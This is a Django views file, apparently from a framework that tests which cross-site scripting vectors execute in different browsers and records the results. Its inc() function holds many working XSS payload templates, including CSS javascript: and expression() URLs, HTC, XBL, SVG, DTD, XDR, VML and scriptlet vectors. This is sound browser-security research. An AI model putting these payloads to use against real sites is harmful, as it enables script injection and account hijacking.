# Create your views here.
# -*- coding: utf-8 -*-
import re
from django.forms.fields import MultipleChoiceField
from django.shortcuts import render_to_response
from django.template import Context, loader
from django.http import HttpResponse, HttpResponseRedirect
from django.template import RequestContext
from xdb.latex import gen_vertical_table
from xdb.models import *
from xdb.util import  build_vector, xss_payload, test_payload, eval_payload
from django import forms
from django.forms import ModelForm
from django.db import models
from xdb.weka import csv_output, family_csv_output
from django.contrib.sites.models import Site

def index(request):
    return render_to_response('index.html')

def vectors(request):
    vector_list= Vector.objects.all()
    t= loader.get_template('vectors.html')
    c= Context({
        'vector_list':vector_list,
    })
    return HttpResponse(t.render(c))

def xss(request, vector_id):
    v = Vector.objects.get(id=vector_id)
    xss_instance = build_vector(v,xss_payload(),"xss")
    return HttpResponse(xss_instance.decode('string_escape'))

def test(request, vector_id, context_id, encoding_id, verdict):
    b=Browser.objects.get(id=request.session['browser'])
    v=Vector.objects.get(id=vector_id)
    wc=WebContext.objects.get(id=context_id)
    enc=Encoding.objects.get(id=encoding_id)
    if verdict == "pass":
        #todo: refactoring test object update
        t=Test.objects.filter(browser=b,vector=v,context=wc,encoding=enc)
        if t:
            t=t[0]
            t.result="PASS"
        else:
            t=Test(browser=b,vector=v,context=wc,encoding=enc,result="PASS")
        t.save()
        return HttpResponseRedirect("/test/next")
    elif verdict == "xhrpass":
        #todo: refactoring test object update
        t=Test.objects.filter(browser=b,vector=v,context=wc,encoding=enc)
        if t:
            t=t[0]
            t.result="PASS"
        else:
            t=Test(browser=b,vector=v,context=wc,encoding=enc,result="PASS")
        t.save()
        return HttpResponse("test n°"+str(vector_id)+" passed via xhttprequest")
    elif verdict =="imgpass":
        t=Test.objects.filter(browser=b,vector=v,context=wc,encoding=enc)
        if t:
            t=t[0]
            t.result="PASS"
        else:
            t=Test(browser=b,vector=v,context=wc,encoding=enc,result="PASS")
        t.save()
        #TODO: Fix this fucking path deployment issue !!!
        image_data = open("static/img/pass.png", "rb").read()
        return HttpResponse(image_data, mimetype="image/png")
    else:
        #todo: refactoring test object update
        baseurl=request.build_absolute_uri("/")
        domain=Site.objects.get_current()
        xss_instance = build_vector(v,
                                    test_payload(vector_id,context_id,encoding_id,baseurl,domain),
                                    "test",
                                    context_id,
                                    encoding_id,
                                    baseurl
        )
        t=Test.objects.filter(browser=b,vector=v,context=wc,encoding=enc)
        if t:
            t=t[0]
            t.result="SENT"
        else:
            t=Test(browser=b,vector=v,context=wc,encoding=enc,result="SENT")
        t.save()
        #source=str(wc.source).replace("%(xss)s",xss_instance)
        source=wc.source % {"xss":xss_instance}
        resp=HttpResponse(source.decode('string_escape'), content_type=wc.mimetype+"; "+enc.web_encoding)
        return resp
        #return render_to_response('xss.html',{'xss':xss_instance})

def my_results(request):
    dispb=request.META['HTTP_USER_AGENT']
    myb=Browser.objects.filter(ua=dispb)
    if myb:
        b=myb[0]
        return HttpResponseRedirect("/browser/"+str(b.id)+"/")
    else:
        return HttpResponse("<a href='/browser/add'>No results for you, please register and test your browser first</a>")

def next_test(request):
    #redirect the browser to the next test according to the executed test suite
    dispb=request.META['HTTP_USER_AGENT']
    #grab the user agent of the registered browser session
    sessb=Browser.objects.filter(id=request.session['browser'])[0].ua
    if sessb!=dispb:
        return HttpResponse("<a href='/browser/add'>please register your browser first</a>")
    todo=request.session['tests']
    if len(todo) > 0:
        next=todo.pop()
        request.session['tests']=todo
        url="/test/%(vid)s/%(cid)s/%(eid)s/" % {'vid':next[0],'cid':next[1],'eid':next[2]}
        resp= HttpResponseRedirect(url)
    else:
        resp= HttpResponse("suite executed")
    for c in request.COOKIES:
        cmatch=re.match("(?P<vid>\d+)-(?P<cid>\d+)-(?P<eid>\d+)",c)
        if cmatch:
            vnum=int(cmatch.group("vid"))
            cnum=int(cmatch.group("cid"))
            encnum=int(cmatch.group("eid"))
            b=Browser.objects.get(id=request.session['browser'])
            v=Vector.objects.get(id=vnum)
            wc=WebContext.objects.get(id=cnum)
            enc=Encoding.objects.get(id=encnum)
            #todo: refactoring test object update
            t=Test.objects.filter(browser=b,vector=v,context=wc,encoding=enc)
            if t:
                t=t[0]
                t.result="PASS"
            else:
                t=Test(browser=b,vector=v,context=wc,encoding=enc,result="PASS")
            t.save()
            resp.delete_cookie(c)
    return resp

def resume_test(request):
    return render_to_response('suiterun.html')


def inc(request,context, vector_id,context_id,encoding_id,type):
    #return a given payload as an include like .js or .css etc...
    response=HttpResponse()

    if context=="xss":
        source=xss_payload()
    elif context=="test":
        baseurl=request.build_absolute_uri("/")
        domain=Site.objects.get_current()
        source=test_payload(vector_id,context_id,encoding_id,baseurl,domain)
    else:
        return HttpResponse("WTF BBQ?")
    if type=="css":
        css="""  background-image: url('javascript:%(eval_p)s;');
  background-image: expression(%(eval_p)s);
  -moz-binding:url("%(xssmoz)s");
}{-o-link:'javascript:%(eval_p)s';-o-link-source: current;}"""
        eval_p=eval_payload(source)
        response['Content-type']='text/css'
        response.write(css % {'eval_p':eval_p,'xssmoz':''})
        return response
    elif type=="js":
        response['Content-type']='application/javascript'
        response.write(source)
        return response
    elif type=="jpg":
        response['Content-type']='image/jpeg'
        response.write(source)
        return response
    elif type=="htc":
        eval_p=eval_payload(source)
        htc="""
        <?xml version="1.0"?> <x> <payload><![CDATA[<img src=x onerror=%(eval_p)s>]]></payload> </x>
        <PUBLIC:COMPONENT TAGNAME="xss">
   <PUBLIC:ATTACH EVENT="ondocumentready" ONEVENT="main()" LITERALCONTENT="false"/>
</PUBLIC:COMPONENT>
<SCRIPT>
   function main()
   {
     """+source+""";
   }
</SCRIPT>"""
        response['Content-type']='text/plain'
        response.write(htc % {'eval_p':eval_p,})
        return response
    elif type=="html":
        return render_to_response('payload.html',{'source':source,})
    elif type=="xbl":
        eval_p=eval_payload(source)
        xbl="""
        <?xml version="1.0" ?><bindings xmlns="http://www.mozilla.org/xbl"><binding id="xss"><implementation><constructor><![CDATA[%(eval_p)s]]></constructor></implementation></binding></bindings>"""
        return HttpResponse(xbl % {'eval_p':eval_p,} )
    elif type=="svg":
        eval_p=eval_payload(source)

        svg="""
        <form xmlns="http://www.w3.org/1999/xhtml" target="_top" action="javascript:%(eval_p)s"><input value="XXX" type="submit"/></form>
        """
        response['Content-type']='image/svg+xml'
        response.write(svg % {'eval_p':eval_p,} )
        return response
    elif type=="svg2":
        svg="""<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg onload="%(eval_p)s" xmlns="http://www.w3.org/2000/svg"><defs><font id="x"><font-face font-family="y"/></font></defs></svg>"""
        response['Content-type']='image/svg+xml'
        eval_p=eval_payload(source)
        response.write(svg % {'eval_p':eval_p,} )
        return response
    elif type=="svg3":
        svg="""<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">  <clipPath id="a" > <set xlink:href="#x" attributeName="xlink:href" begin="1s" to="javascript:%(eval_p)s" /> </clipPath>  <pattern id="b"> <set xlink:href="#x" attributeName="xlink:href" begin="2s" to="javascript:%(eval_p)s" /> </pattern>  <filter id="c"> <set xlink:href="#x" attributeName="xlink:href" begin="3s" to="javascript:%(eval_p)s" /> </filter>  <marker id="d"> <set xlink:href="#x" attributeName="xlink:href" begin="4s" to="%(eval_p)s" /> </marker>  <mask id="e"> <set xlink:href="#x" attributeName="xlink:href" begin="5s" to="javascript:%(eval_p)s" /> </mask>  <linearGradient id="f"> <set xlink:href="#x" attributeName="xlink:href" begin="6s" to="javascript:%(eval_p)s" /> </linearGradient>  </svg>"""
        response['Content-type']='image/svg+xml'
        eval_p=eval_payload(source)
        response.write(svg % {'eval_p':eval_p,} )
        return response
    elif type=="svg4":
        svg="""<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"> <marker id="a" markerWidth="1000" markerHeight="1000" refX="0" refY="0"> <a xlink:href="http://google.com"> <set attributeName="xlink:href" to="javascript:alert(1)" begin="1s" /> <rect width="1000" height="1000" fill="white"/> </a> </marker> </svg>"""
        response['Content-type']='image/svg+xml'
        eval_p=eval_payload(source)
        response.write(svg % {'eval_p':eval_p,} )
        return response
    elif type=="xxe":
        xxe="""<script xmlns="http://www.w3.org/1999/xhtml">%(eval_p)s</script>"""
        eval_p=eval_payload(source)
        return HttpResponse(xxe % {'eval_p':eval_p,} )
    elif type=="dtd":
        dtd="""<!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='%(eval_p)s'/&#x3E;">"""
        eval_p=eval_payload(source)
        return HttpResponse(dtd % {'eval_p':eval_p,} )
    elif type=="xdr":
        xdr="""<?xml version="1.0"?> <Schema name="x" xmlns="urn:schemas-microsoft-com:xml-data"> <ElementType name="img"> <AttributeType name="src" required="yes" default="x"/> <AttributeType name="onerror" required="yes" default="%(eval_p)s"/> <attribute type="src"/> <attribute type="onerror"/> </ElementType> </Schema>"""
        eval_p=eval_payload(source)
        return HttpResponse(xdr % {'eval_p':eval_p,} )
    elif type=="evt":
        evt="""<script xmlns="http://www.w3.org/1999/xhtml" id="x">%(eval_p)s</script>"""
        eval_p=eval_payload(source)
        return HttpResponse(evt % {'eval_p':eval_p,} )
    elif type=="vml":
        vml="""<xml> <rect style="height:100%;width:100%" id="xss" onmouseover="%(eval_p)s" strokecolor="white" strokeweight="2000px" filled="false" /> </xml>"""
        eval_p=eval_payload(source)
        return HttpResponse(vml % {'eval_p':eval_p,} )
    elif type=="sct":
        sct="""<SCRIPTLET> <IMPLEMENTS Type="Behavior"></IMPLEMENTS> <SCRIPT Language="javascript">%(eval_p)s</SCRIPT> </SCRIPTLET>"""
        eval_p=eval_payload(source)
        return HttpResponse(sct % {'eval_p':eval_p,} )
    elif type=="php":
        event="""Event: load\ndata: \n\n"""
        eval_p=eval_payload(source)
        response['Content-type']='application/x-dom-event-stream'
        response.write(event)
        return response
    else:
        return HttpResponse("fail !")

def suite_content(request,suite_id):
    #display suite content
    suite=Suite.objects.get(id=suite_id)
    vectors=suite.vectors.all()
    return render_to_response('suite.html',{'suite':suite,'vectors':vectors})

def suite_results(request,suite_id):
    #TODO : rebuild it !!!
    suite=Suite.objects.get(id=suite_id)
    vectors=suite.vectors.all()
    results=Test.objects.filter(vector=vectors)
    #for v in vectors:
    #return render_to_response('suite.html',{'suite':suite,'browsers':browser,'results':results})
    return HttpResponse("blah !")

def results(request):
    browsers=Browser.objects.all()
    vectors=Vector.objects.all()
    return render_to_response('results.html',{'browsers':browsers,'vectors':vectors})

def all_results(request):
    browsers=Browser.objects.all()
    vectors=Vector.objects.all()
    return render_to_response('results.html',{'browsers':browsers,'vectors':vectors})

def suites(request):
    #diplay test suites
    suites=Suite.objects.all()
    return render_to_response('suites.html',{'suites':suites})

def suite_run(request, suite_id):
    #grab current user agent
    dispb=request.META['HTTP_USER_AGENT']
    b=Browser.objects.filter(ua=dispb)
    #grab the user agent of the registered browser session
    if 'browser' in request.session:
        sessb=Browser.objects.filter(id=request.session['browser'])
        if sessb:
            sessb=sessb[0].ua
        else:
            return HttpResponse("<a href='/browser/add'>please register your browser first</a>")
    else:
        return HttpResponse("<a href='/browser/add'>please register your browser first</a>")
    if sessb!=dispb:
        return HttpResponse("<a href='/browser/add'>please register your browser first</a>")
    if b:
        #present run options (web context(s), encoding(s) for the given suite)
        b=b[0]
        request.session['browser']=b.id
        request.session['suite']=suite_id
        todo=[]
        for v in Suite.objects.get(id=suite_id).vectors.all():
            for wc in Suite.objects.get(id=suite_id).contexts.all():
                for enc in Suite.objects.get(id=suite_id).encodings.all():
                    todo.append((v.id,wc.id,enc.id))
        request.session['tests']=todo
        return render_to_response('suiterun.html')
    else:
        return HttpResponse("<a href='/browser/add'>please register your browser first</a>")

class FilterForm(forms.Form):
    latex=forms.BooleanField(required=False)
    csv=forms.BooleanField(required=False)
    binary=forms.BooleanField(required=False)
    b_selection=forms.ModelMultipleChoiceField(queryset=Browser.objects.all())
    v_selection=forms.ModelMultipleChoiceField(queryset=Vector.objects.all())
    c_selection=forms.ModelMultipleChoiceField(queryset=WebContext.objects.all())
    e_selection=forms.ModelMultipleChoiceField(queryset=Encoding.objects.all())

def filter(request):
    if request.method=='POST':
        #a result filter was asked for
        form=FilterForm(request.POST)
        if form.is_valid():
            blist=form.cleaned_data['b_selection']
            vlist=form.cleaned_data['v_selection']
            clist=form.cleaned_data['c_selection']
            elist=form.cleaned_data['e_selection']
            latex=form.cleaned_data['latex']
            csv=form.cleaned_data['csv']
            binary=form.cleaned_data['binary']
            if latex:
                result=gen_vertical_table(blist,vlist)
                return HttpResponse(result, mimetype="text/plain")
            elif csv:
                result=csv_output(blist,vlist,clist,elist,binary)
                return HttpResponse(result, mimetype="text/plain")
            else:
                return render_to_response('results.html',{'browsers':blist,'vectors':vlist})
    else:
        #display form stuff
        form=FilterForm()
        return render_to_response('filter.html',{'form':form,'target':'filter'},
            context_instance=RequestContext(request))

class FamilyFilterForm(forms.Form):
    binary=forms.BooleanField(required=False)
    #per familly filtering
    ua_validity=forms.ChoiceField(
        choices=(('valid','valid ua only'),('unvalid','unvalidated ua only'),('all','all ua available')),
        widget=forms.RadioSelect
    )
    f_selection=forms.ModelMultipleChoiceField(queryset=BrowserFamily.objects.all())
    v_selection=forms.ModelMultipleChoiceField(queryset=Vector.objects.all())
    c_selection=forms.ModelMultipleChoiceField(queryset=WebContext.objects.all())
    e_selection=forms.ModelMultipleChoiceField(queryset=Encoding.objects.all())

def family_filter(request):
    if request.method=='POST':
        form=FamilyFilterForm(request.POST)
        if form.is_valid():
            flist=form.cleaned_data['f_selection']
            vlist=form.cleaned_data['v_selection']
            clist=form.cleaned_data['c_selection']
            elist=form.cleaned_data['e_selection']
            binary=form.cleaned_data['binary']
            uavalidity=form.cleaned_data['ua_validity']
            result=family_csv_output(flist,vlist,clist,elist,binary,uavalidity)
            return HttpResponse(result, mimetype="text/plain")
    else:
        #display form stuff
        form=FamilyFilterForm()
        return render_to_response('filter.html',{'form':form,'target':'familyfilter'},
            context_instance=RequestContext(request))

class BrowserForm(ModelForm):
    class Meta:
        model=Browser
        exclude=("valid_ua","test_date","ua","build_date",)

def browser(request,action):
    if action=='add' and request.method=='POST':
        form=BrowserForm(request.POST)
        if form.is_valid():
            b=Browser.objects.filter(ua=request.META['HTTP_USER_AGENT'])
            if b:
                brow=BrowserForm(request.POST,instance=b[0])
                brow.save()
                request.session['browser']=b[0].id
            else:
                b=Browser(ua=request.META['HTTP_USER_AGENT'])
                brow=BrowserForm(request.POST,instance=b)
                brow.save()
                request.session['browser']=b.id
            return HttpResponseRedirect('/suites')
        else:
            return HttpResponse("Did you select a plugin and a browser family ?\n if you have no plugins in your browser select None")
    if action=='add' and request.method=='GET':
        b=Browser.objects.filter(ua=request.META['HTTP_USER_AGENT'])
        if b:
            form=BrowserForm(instance=b[0])
        else:
            form=BrowserForm()
        return render_to_response('browser.html',{'form':form,},
                            context_instance=RequestContext(request)
        )
    if action=='list':
        browser_list=Browser.objects.all()
        return render_to_response('browser.html',{'browser_list':browser_list,})
    return HttpResponse("WUT ???",mimetype="text/plain")



def browser_results(request,browser_id):
    tlist=Test.objects.filter(result="PASS")
    #clist=Context.objects.all()
    vlist=[]
    for t in tlist:
        vlist.append(t.vector)
    vlist=list(set(vlist))
    browser=Browser.objects.get(id=browser_id)
    t= loader.get_template('browser.html')
    c= Context({
        'vectors':vlist,
        'browser':browser,
    })

    return HttpResponse(t.render(c))
    #return HttpResponse(browser.desc)